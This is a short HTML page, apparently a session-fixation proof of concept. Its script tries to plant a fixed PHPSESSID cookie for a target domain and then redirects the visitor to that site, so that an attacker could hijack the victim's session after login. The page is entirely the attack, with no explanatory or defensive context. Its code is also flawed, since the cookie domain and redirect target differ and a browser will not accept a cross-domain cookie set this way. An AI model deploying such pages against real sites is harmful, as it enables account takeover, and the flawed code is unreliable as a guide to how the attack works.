<!DOCTYPE html>
<html>
<head>
    <title>Set Cookie</title>
</head>
<body>
    <script>
        // JavaScript to set a cookie and redirect to another domain
        document.cookie = "PHPSESSID=ISOAH1234; domain=yourtarget.com; path=/; SameSite=None; Secure";
        
        // Redirect to the target URL
        window.location.href = "https://target.com";
    </script>
    <p>If you are not redirected, click <a href="https://target.com">here</a>.</p>
</body>
</html>
